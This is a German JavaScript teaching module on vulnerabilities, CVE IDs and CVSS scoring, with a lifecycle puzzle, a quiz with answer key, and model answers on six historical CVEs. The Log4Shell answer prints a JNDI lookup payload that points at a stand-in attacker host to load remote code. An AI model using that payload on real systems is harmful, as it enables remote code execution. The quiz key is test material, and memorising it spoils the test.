/*
 * vulnerabilities.js - Modul: Schwachstellen & CVE
 * Konzept-Erklärung (Vulnerability/Exploit/Patch, CVE-Katalog, CVSS-Skala),
 * ein Reihenfolge-Puzzle zum Schwachstellen-Lebenszyklus, ein
 * schwierigkeitsgestuftes Quiz sowie eine Praxisaufgabe: echte historische
 * Schwachstellen ausserhalb der Plattform recherchieren. Die Recherche
 * selbst kann hier naturgemäss nicht automatisch geprüft werden - die
 * eingegebenen Notizen werden nur lokal gespeichert, dazu gibt es je Fall
 * eine Modellantwort zum Selbst-Check.
 */

const MODULE_ID = "vulnerabilities";

/* ---------- Lebenszyklus-Reihenfolge-Puzzle ---------- */

const LIFECYCLE_STEPS = [
  { id: "discovery", label: "Schwachstelle wird entdeckt (z.B. durch Sicherheitsforscher, Pentest oder Zufall)" },
  { id: "disclosure", label: "Responsible Disclosure: Hersteller wird vertraulich informiert, bevor Details öffentlich werden" },
  { id: "cveid", label: "Eine CNA vergibt eine eindeutige CVE-ID für den Katalog" },
  { id: "patch", label: "Hersteller entwickelt einen Patch und veröffentlicht ein Security-Advisory" },
  { id: "enrich", label: "NVD reichert den CVE-Eintrag mit CVSS-Score und CWE-Klassifizierung an" },
  { id: "rollout", label: "Unternehmen rollen den Patch im eigenen Netzwerk aus (Patch-Management)" },
  { id: "wild", label: "Schlimmster Fall, falls zu spät gepatcht: Exploit-Code wird öffentlich gegen ungepatchte Systeme eingesetzt" },
];

let lifecyclePuzzle = null;

function checkLifecycle() {
  if (!lifecyclePuzzle) return;
  const allCorrect = lifecyclePuzzle.check();
  const fb = document.getElementById("lifecycle-feedback");
  fb.classList.remove("hidden");
  fb.className = "feedback-box " + (allCorrect ? "correct" : "incorrect");
  fb.innerHTML = allCorrect
    ? "<strong>Richtig!</strong> Genau das ist der typische Ablauf, vom Fund bis (im besten Fall) zum flächendeckend installierten Patch."
    : "<strong>Noch nicht ganz.</strong> Grün markierte Karten sind an der richtigen Position, rote nicht - ordne sie neu und prüfe erneut.";
}

/* ---------- Quiz ---------- */

const QUIZ = [
  {
    difficulty: "easy",
    question: "Wofür steht die Abkürzung CVE, und wozu dient ein CVE-Eintrag?",
    options: [
      "Common Vulnerabilities and Exposures - ein öffentlicher Katalog, der jeder bekannten Schwachstelle eine eindeutige, weltweit einheitliche ID gibt",
      "Certified Vulnerability Evaluation - eine Zertifizierung für besonders sichere Software",
      "Central Virus Exchange - eine Datenbank bekannter Schadsoftware-Signaturen",
    ],
    correctIndex: 0,
    explanation:
      "CVE (Common Vulnerabilities and Exposures) ist kein Zertifikat und keine Malware-Datenbank, sondern ein eindeutiges Nummerierungssystem für öffentlich bekannte Schwachstellen - damit Hersteller, Forscher und Tools zweifelsfrei über dieselbe Schwachstelle sprechen können.",
  },
  {
    difficulty: "easy",
    question: "Wie ist eine CVE-ID aufgebaut?",
    options: [
      "CVE-&lt;Jahr&gt;-&lt;laufende Nummer&gt;, z.B. CVE-2021-44228",
      "CVE-&lt;Herstellername&gt;-&lt;Produktversion&gt;",
      "CVE-&lt;CVSS-Score&gt;-&lt;Schweregrad&gt;",
    ],
    correctIndex: 0,
    explanation:
      "Das Jahr im Format steht für das Jahr der ID-Zuweisung (nicht zwingend das Jahr der öffentlichen Bekanntmachung), gefolgt von einer laufenden Nummer - z.B. ist CVE-2021-44228 die bekannte Log4Shell-Schwachstelle.",
  },
  {
    difficulty: "easy",
    question: "Was ist der Unterschied zwischen einer Schwachstelle (Vulnerability) und einem Exploit?",
    options: [
      "Die Schwachstelle ist der zugrundeliegende Fehler selbst; der Exploit ist der konkrete Code bzw. die Technik, die diesen Fehler tatsächlich ausnutzt",
      "Es gibt keinen Unterschied, beide Begriffe meinen exakt dasselbe",
      "Ein Exploit ist immer harmlos, nur eine Schwachstelle kann gefährlich sein",
    ],
    correctIndex: 0,
    explanation:
      "Eine Schwachstelle existiert, sobald der Fehler im Code/der Konfiguration vorhanden ist - unabhängig davon, ob sie je ausgenutzt wird. Ein Exploit ist das konkrete Werkzeug/Vorgehen, mit dem ein Angreifer diesen Fehler tatsächlich missbraucht.",
  },
  {
    difficulty: "medium",
    question: "Was genau misst der CVSS Base Score (0.0 bis 10.0)?",
    options: [
      "Den technischen Schweregrad einer Schwachstelle anhand klar definierter Kriterien (z.B. Angreifbarkeit aus dem Netz, benötigte Rechte, Auswirkung) - unabhängig vom konkreten Einsatzumfeld",
      "Wie viele Systeme weltweit von genau dieser Schwachstelle tatsächlich betroffen sind",
      "Wie schnell ein Hersteller nach Bekanntwerden einen Patch veröffentlicht hat",
    ],
    correctIndex: 0,
    explanation:
      "CVSS bewertet rein die technischen Eigenschaften der Schwachstelle selbst (Angriffsweg, Komplexität, benötigte Rechte, Nutzerinteraktion, Auswirkung auf Vertraulichkeit/Integrität/Verfügbarkeit) - wie viele Systeme betroffen sind oder wie schnell gepatcht wurde, fliesst dort nicht ein.",
  },
  {
    difficulty: "medium",
    question: "Welche CVSS-Severity-Stufe entspricht einem Base Score zwischen 9.0 und 10.0?",
    options: ["Critical", "High", "Medium", "Low"],
    correctIndex: 0,
    explanation:
      "Die fünf CVSS-v3-Stufen sind: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9) und Critical (9.0-10.0) - 9.0-10.0 ist damit die höchste Einstufung.",
  },
  {
    difficulty: "medium",
    question: "Was bedeutet es, wenn eine Schwachstelle als \"Zero-Day\" bezeichnet wird?",
    options: [
      "Sie wird bereits aktiv ausgenutzt, BEVOR ein Patch des Herstellers existiert - dem Hersteller blieben quasi null Tage Vorlaufzeit",
      "Sie wurde genau am Tag ihrer Entdeckung sofort vollständig behoben",
      "Sie betrifft ausschliesslich Software, die seit null Tagen auf dem Markt ist",
    ],
    correctIndex: 0,
    explanation:
      "\"Zero-Day\" bezieht sich auf den Zeitpunkt relativ zur Ausnutzung: die Schwachstelle wird (oder wurde) bereits missbraucht, ohne dass der Hersteller vorher die Chance hatte, einen Patch bereitzustellen - im Gegensatz zu \"N-Day\"-Schwachstellen, für die längst ein Patch existiert, der nur noch nicht installiert wurde.",
  },
  {
    difficulty: "hard",
    question:
      "Zwei Schwachstellen haben denselben CVSS Base Score von 9.8 (Critical). Schwachstelle A betrifft einen internen Verwaltungsdienst ohne Internetzugang, Schwachstelle B eine Komponente, die direkt aus dem Internet erreichbar ist und bereits laut CISA KEV-Liste aktiv ausgenutzt wird. Welche Aussage trifft zu?",
    options: [
      "Beide haben zwar denselben technischen CVSS-Schweregrad, das tatsächliche Risiko für das Unternehmen ist bei B aber deutlich höher - Priorisierung beim Patchen sollte immer CVSS UND realen Kontext (Erreichbarkeit, aktive Ausnutzung) berücksichtigen",
      "Da beide denselben CVSS-Score haben, ist das Risiko für das Unternehmen in beiden Fällen exakt identisch",
      "Schwachstelle A ist automatisch gefährlicher, weil interne Systeme generell schlechter geschützt sind",
    ],
    correctIndex: 0,
    explanation:
      "CVSS bewertet nur die technischen Eigenschaften der Schwachstelle selbst, nicht den Kontext, in dem sie bei dir eingesetzt wird. Erreichbarkeit aus dem Internet und bereits bekannte aktive Ausnutzung (z.B. gelistet in der CISA-KEV-Liste) erhöhen das reale Risiko erheblich - deshalb braucht Priorisierung beim Patchen immer beide Blickwinkel.",
  },
  {
    difficulty: "hard",
    question:
      "Warum vergibt nicht ausschliesslich MITRE selbst jede einzelne CVE-ID, sondern ein grosser Teil über sogenannte CNAs (CVE Numbering Authorities)?",
    options: [
      "CNAs sind autorisierte Hersteller/Organisationen, die für ihre eigenen Produkte selbst neue CVE-IDs vergeben dürfen - das verteilt die Arbeitslast und beschleunigt die Zuweisung, bei weiterhin eindeutigem, zentral koordiniertem Nummernraum",
      "CNAs vergeben IDs komplett unabhängig von MITRE, wodurch es inzwischen mehrere konkurrierende CVE-Kataloge gibt",
      "CNAs sind nur für die CVSS-Bewertung zuständig, MITRE vergibt weiterhin ausnahmslos jede ID selbst",
    ],
    correctIndex: 0,
    explanation:
      "Das CNA-System ist eine dezentrale Delegation innerhalb EINES einheitlichen CVE-Programms: Hersteller und Security-Organisationen dürfen für ihre eigenen Produkte/ihren Zuständigkeitsbereich selbst IDs vergeben, ohne dass jede einzelne Anfrage über MITRE laufen muss - der Nummernraum bleibt dabei weltweit eindeutig und zentral koordiniert.",
  },
  {
    difficulty: "hard",
    question:
      "Eine Schwachstelle hat den Vector-String CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. Was macht genau diese Kombination besonders kritisch?",
    options: [
      "Aus dem Netz erreichbar (AV:N), technisch einfach auszunutzen (AC:L), ohne vorherige Rechte (PR:N) und ohne Nutzerinteraktion (UI:N), mit Auswirkung über die Komponente hinaus (S:C) und vollem Schaden auf Vertraulichkeit, Integrität UND Verfügbarkeit (C:H/I:H/A:H)",
      "Die Schwachstelle betrifft ausschliesslich lokale Angriffe mit physischem Zugriff auf das Gerät",
      "Die Kombination bedeutet, dass zwingend eine Nutzerinteraktion wie ein Klick nötig ist, bevor überhaupt etwas passiert",
    ],
    correctIndex: 0,
    explanation:
      "Jedes einzelne Kürzel steht auf der jeweils \"schlimmsten\" Ausprägung: Network-erreichbar statt lokal, niedrige statt hohe Komplexität, keine Rechte und keine Nutzerinteraktion nötig, Scope changed (wirkt über die ursprüngliche Komponente hinaus) und voller Impact auf alle drei Schutzziele - exakt diese Kombination ergibt rechnerisch den Maximalwert von 10.0.",
  },
];

function renderQuiz() {
  const container = document.getElementById("quiz-container");
  container.innerHTML = "";

  QUIZ.forEach((q, qIdx) => {
    const wrapper = document.createElement("div");
    wrapper.className = "card";
    wrapper.style.marginBottom = "14px";
    const diffLabel = { easy: "Leicht", medium: "Mittel", hard: "Schwer" }[q.difficulty];
    wrapper.innerHTML = `
      <span class="badge difficulty-${q.difficulty}" style="margin-bottom:8px;">${diffLabel}</span>
      <h4 style="margin-top:4px;">${qIdx + 1}. ${q.question}</h4>
      <div class="option-list" data-question="${qIdx}"></div>
      <div class="feedback-box hidden" data-explanation="${qIdx}"></div>
    `;
    const list = wrapper.querySelector(".option-list");
    const shuffledOrder = shuffleArray(q.options.map((_, i) => i));
    shuffledOrder.forEach((oIdx) => {
      const opt = q.options[oIdx];
      const item = document.createElement("div");
      item.className = "option-item";
      item.dataset.origIndex = String(oIdx);
      item.innerHTML = `<input type="radio" name="vulnq${qIdx}" /> <span>${opt}</span>`;
      item.addEventListener("click", () => {
        list.querySelectorAll(".option-item").forEach((el) => {
          el.classList.remove("selected");
          el.querySelector("input").checked = false;
        });
        item.classList.add("selected");
        item.querySelector("input").checked = true;
        list.dataset.chosenIndex = String(oIdx);
      });
      list.appendChild(item);
    });
    container.appendChild(wrapper);
  });
}

function checkQuiz() {
  const lists = document.querySelectorAll("#quiz-container .option-list");
  let correctCount = 0;

  lists.forEach((list, qIdx) => {
    const chosenIndex = list.dataset.chosenIndex;
    const q = QUIZ[qIdx];
    const items = list.querySelectorAll(".option-item");
    items.forEach((item) => {
      const oIdx = Number(item.dataset.origIndex);
      if (oIdx === q.correctIndex) item.classList.add("correct-answer");
      if (chosenIndex !== undefined && Number(chosenIndex) === oIdx && oIdx !== q.correctIndex) {
        item.classList.add("wrong-answer");
      }
    });
    if (Number(chosenIndex) === q.correctIndex) correctCount++;

    const expBox = list.parentElement.querySelector(`[data-explanation="${qIdx}"]`);
    expBox.classList.remove("hidden");
    expBox.className = "feedback-box " + (Number(chosenIndex) === q.correctIndex ? "correct" : "incorrect");
    expBox.innerHTML = q.explanation;
  });

  const fb = document.getElementById("quiz-feedback");
  fb.classList.remove("hidden");
  const allCorrect = correctCount === QUIZ.length;
  fb.className = "feedback-box " + (allCorrect ? "correct" : "incorrect");
  fb.innerHTML = `<strong>${correctCount} / ${QUIZ.length} richtig.</strong>`;

  if (allCorrect) {
    const wasDone = getModuleStatus(MODULE_ID) === "done";
    setModuleStatus(MODULE_ID, "done", { quizScore: correctCount });
    if (!wasDone) {
      document.getElementById("completion-banner").classList.remove("hidden");
    }
  } else {
    setModuleStatus(MODULE_ID, "progress", { quizScore: correctCount });
  }
}

/* ---------- Praxisaufgabe: CVE-Recherche ---------- */

const RESEARCH_QUESTIONS = [
  { id: "q1", label: "Was genau macht die Schwachstelle möglich (in eigenen Worten, als wäre es einem Kollegen ohne Security-Hintergrund erklärt)?" },
  { id: "q2", label: "Welcher CVSS-Score/Severity wird im offiziellen Eintrag angegeben, und welche Vector-Bestandteile (AV/AC/PR/UI/C/I/A) stechen besonders heraus?" },
  { id: "q3", label: "Welche konkreten realen Auswirkungen/Vorfälle gab es (betroffene Firmen, Ausmass, evtl. Folge-Angriffe)?" },
  { id: "q4", label: "Wie wurde die Schwachstelle letztlich behoben (Patch, Workaround, Konfigurationsänderung)?" },
];

const CVE_CASES = [
  {
    id: "heartbleed",
    icon: "💔",
    title: "Heartbleed",
    cveId: "CVE-2014-0160",
    date: "2014",
    hint:
      "Betrifft die weitverbreitete Verschlüsselungs-Bibliothek <strong>OpenSSL</strong>, genauer deren TLS/SSL-\"Heartbeat\"-Erweiterung.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2014-0160" },
    ],
    modelAnswer:
      "Ein Fehler in der Heartbeat-Erweiterung von OpenSSL erlaubte es, den Server (bzw. Client) dazu zu bringen, bis zu 64 KB Speicherinhalt über das erlaubte Mass hinaus zurückzuschicken (\"Out-of-bounds Read\", CWE-125) - darin konnten private Schlüssel, Session-Tokens oder Passwörter liegen. NVD stuft die Schwachstelle mit CVSS v3.1 bei ca. 7.5 (High) ein: aus dem Netz erreichbar, technisch einfach, keine Rechte/Interaktion nötig, aber Auswirkung NUR auf Vertraulichkeit (kein Schreibzugriff, kein Absturz). Weltweit waren schätzungsweise 17% der TLS-Webserver betroffen; nach Bekanntwerden mussten unzählige Organisationen in kurzer Zeit TLS-Zertifikate widerrufen und neu ausstellen. Behoben wurde sie durch ein OpenSSL-Update, das die Länge des angeforderten Heartbeat-Pakets korrekt gegen die tatsächliche Nutzlast prüft.",
  },
  {
    id: "shellshock",
    icon: "🐚",
    title: "Shellshock",
    cveId: "CVE-2014-6271",
    date: "2014",
    hint: "Betrifft die <strong>Bash</strong>-Shell, die auf fast jedem Linux/Unix-System und vielen Netzwerkgeräten läuft.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-6271" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2014-6271" },
    ],
    modelAnswer:
      "Bash interpretierte Text NACH dem eigentlichen Ende einer Funktionsdefinition in einer Umgebungsvariable versehentlich weiter als auszuführende Befehle (OS Command Injection, CWE-78). Da viele Webserver Nutzereingaben (z.B. HTTP-Header) direkt in Umgebungsvariablen für CGI-Skripte übernehmen, liess sich darüber beliebiger Code auf dem Server ausführen - ganz ohne Login. NVD bewertet sie (CVSS v3) mit 9.8 (Critical): aus dem Netz, technisch einfach, keine Rechte/Interaktion nötig, voller Schaden auf alle drei Schutzziele. Innerhalb von Stunden nach Bekanntwerden gab es weltweit massenhafte automatisierte Scans und Angriffsversuche auf Webserver und IoT-Geräte. Behoben wurde sie durch einen Bash-Patch, der die Funktionsdefinitions-Erkennung korrekt beendet.",
  },
  {
    id: "eternalblue",
    icon: "🩸",
    title: "EternalBlue",
    cveId: "CVE-2017-0144",
    date: "2017",
    hint: "Betrifft die Windows-<strong>SMBv1</strong>-Implementierung - wurde später durch WannaCry und NotPetya weltberühmt.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2017-0144" },
    ],
    modelAnswer:
      "Ein Pufferüberlauf (Out-of-bounds Write, CWE-787) in der Verarbeitung bestimmter SMBv1-Pakete erlaubte Remote Code Execution ohne Authentifizierung - der Exploit wurde ursprünglich von der NSA entwickelt und 2017 von der Gruppe \"Shadow Brokers\" veröffentlicht. NVD bewertet sie (CVSS v3) mit 8.1 (High): aus dem Netz erreichbar, aber mit höherer Angriffskomplexität als z.B. Shellshock, dafür voller Schaden auf alle drei Schutzziele. Microsoft hatte den Patch (MS17-010) bereits vorher veröffentlicht, trotzdem legte der darauf aufbauende Wurm WannaCry (Mai 2017) weltweit u.a. Teile des britischen Gesundheitsdienstes NHS lahm, kurz darauf richtete die Variante NotPetya bei Firmen wie Maersk Schäden in Milliardenhöhe an - ein Paradebeispiel dafür, wie teuer ungepatchte N-Days werden können. Behoben wurde sie durch das Microsoft-Update MS17-010 bzw. durch Deaktivieren/Entfernen von SMBv1.",
  },
  {
    id: "log4shell",
    icon: "🪵",
    title: "Log4Shell",
    cveId: "CVE-2021-44228",
    date: "2021",
    hint: "Betrifft <strong>Apache Log4j 2</strong>, eine der meistgenutzten Java-Logging-Bibliotheken überhaupt.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2021-44228" },
    ],
    modelAnswer:
      "Log4j protokollierte Eingabetext teilweise ungeprüft und löste darin enthaltene JNDI-Lookups auf (z.B. <code class=\"mono\">${jndi:ldap://angreifer.example/x}</code>) - ein Angreifer konnte so einen beliebigen String irgendwo loggen lassen (z.B. im User-Agent-Header) und dadurch Code von einem eigenen Server nachladen und ausführen lassen (verwandt mit CWE-502, Deserialisierung nicht-vertrauenswürdiger Daten). NVD bewertet sie mit dem CVSS-v3.1-Maximalwert 10.0 (Critical) - genau die Kombination AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H aus dem Konzeptteil oben. Da Log4j in extrem vielen Java-Anwendungen (von Cloud-Diensten bis Minecraft-Servern) tief verschachtelt als Abhängigkeit steckte, begannen weltweite automatisierte Scans bereits innerhalb von Stunden nach Bekanntwerden - eine der folgenreichsten Schwachstellen der letzten Jahre. Behoben wurde sie primär durch ein Log4j-Update, das JNDI-Lookups standardmässig deaktiviert.",
  },
  {
    id: "printnightmare",
    icon: "🖨️",
    title: "PrintNightmare",
    cveId: "CVE-2021-34527",
    date: "2021",
    hint: "Betrifft den Windows-<strong>Print-Spooler-Dienst</strong> - relevant für praktisch jede Windows-Domäne.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-34527" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2021-34527" },
    ],
    modelAnswer:
      "Die RPC-Schnittstelle des Print-Spoolers liess sich missbrauchen, um einen Druckertreiber aus einer beliebigen (auch entfernten) Quelle zu installieren - der Treibercode läuft dabei mit SYSTEM-Rechten (Improper Privilege Management, CWE-269), wodurch ein angemeldeter, aber nicht-privilegierter Nutzer bzw. ein Angreifer mit Netzwerkzugriff volle Kontrolle über das System erlangen konnte. NVD bewertet sie mit CVSS v3.1 bei 8.8 (High). Weil der Spooler-Dienst auf praktisch jedem Windows-Server und -Client standardmässig läuft - inklusive Domain Controllern - empfahl Microsoft als Sofortmassnahme, den Dienst dort zu deaktivieren, noch bevor der vollständige Patch verfügbar war. Behoben wurde sie letztlich durch kumulative Windows-Updates, die die Berechtigungsprüfung bei der Treiberinstallation verschärfen.",
  },
  {
    id: "proxylogon",
    icon: "📧",
    title: "ProxyLogon",
    cveId: "CVE-2021-26855",
    date: "2021",
    hint: "Betrifft <strong>Microsoft Exchange Server</strong> (On-Premises) - Teil einer Kette mehrerer verketteter Schwachstellen.",
    links: [
      { label: "NVD-Eintrag", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-26855" },
      { label: "CVE.org-Eintrag", url: "https://www.cve.org/CVERecord?id=CVE-2021-26855" },
    ],
    modelAnswer:
      "Eine Server-Side-Request-Forgery (SSRF) erlaubte es einem Angreifer, sich OHNE jede vorherige Authentifizierung als berechtigt gegenüber dem Exchange-Server auszugeben und interne Anfragen im Namen des Servers auszulösen. In Kombination mit weiteren, zeitgleich veröffentlichten CVEs (u.a. CVE-2021-27065, die beliebiges Schreiben von Dateien nach erfolgtem Login erlaubte) liess sich daraus eine komplette Remote-Code-Execution-Kette bauen. NVD bewertet CVE-2021-26855 mit CVSS v3.1 bei 9.1 (Critical). Die Gruppe \"HAFNIUM\" nutzte die Kette bereits als Zero-Day ab Januar 2021 aktiv aus, bevor Microsoft im März 2021 Notfall-Patches veröffentlichte - danach kompromittierten zusätzlich automatisierte Massen-Scans weltweit zehntausende ungepatchte Exchange-Server, viele davon mit nachträglich platzierten Web-Shells. Behoben wurde die Kette durch ausserplanmässige Exchange-Sicherheitsupdates.",
  },
];

function escapeHtmlAttr(str) {
  return String(str).replace(/"/g, "&quot;");
}

function renderCveResearch() {
  const container = document.getElementById("cve-research-container");
  container.innerHTML = "";

  let notes = {};
  try {
    notes = JSON.parse(localStorage.getItem("cve_research_notes") || "{}");
  } catch (e) {
    notes = {};
  }

  CVE_CASES.forEach((c) => {
    const card = document.createElement("div");
    card.className = "card";
    card.style.marginBottom = "14px";

    const linksHtml = c.links
      .map((l) => `<a href="${escapeHtmlAttr(l.url)}" target="_blank" rel="noopener">${l.label}</a>`)
      .join(" &middot; ");

    const questionsHtml = RESEARCH_QUESTIONS.map((q) => {
      const noteId = `${c.id}_${q.id}`;
      const saved = notes[noteId] ? notes[noteId] : "";
      return `
        <div class="field">
          <label for="note-${noteId}">${q.label}</label>
          <textarea id="note-${noteId}" data-note-id="${noteId}" rows="2">${saved}</textarea>
        </div>`;
    }).join("");

    card.innerHTML = `
      <h4 class="mt-0">${c.icon} ${c.title} &ndash; <code class="mono">${c.cveId}</code> <span class="text-muted" style="font-size:0.85rem;">(${c.date})</span></h4>
      <p>${c.hint}</p>
      <p class="text-muted">🔗 Recherche: ${linksHtml}</p>
      ${questionsHtml}
      <details class="info-toggle">
        <summary>✅ Modellantwort anzeigen (zum Selbst-Check nach deiner Recherche)</summary>
        <div class="info-content">${c.modelAnswer}</div>
      </details>
    `;
    container.appendChild(card);
  });

  container.querySelectorAll("textarea[data-note-id]").forEach((ta) => {
    ta.addEventListener("input", () => {
      notes[ta.dataset.noteId] = ta.value;
      localStorage.setItem("cve_research_notes", JSON.stringify(notes));
    });
  });
}

document.addEventListener("DOMContentLoaded", () => {
  markModuleStarted(MODULE_ID);
  if (getModuleStatus(MODULE_ID) === "done") {
    document.getElementById("completion-banner").classList.remove("hidden");
  }

  lifecyclePuzzle = initReorderPuzzle(document.getElementById("lifecycle-puzzle"), LIFECYCLE_STEPS);
  document.getElementById("lifecycle-check-btn").addEventListener("click", checkLifecycle);

  renderQuiz();
  document.getElementById("check-quiz-btn").addEventListener("click", checkQuiz);

  renderCveResearch();
  initLabChecklist(
    document.getElementById("cve-research-checklist"),
    "lab_cve_research_checklist",
    CVE_CASES.map((c) => `Recherche abgeschlossen: ${c.title} (${c.cveId})`)
  );
});
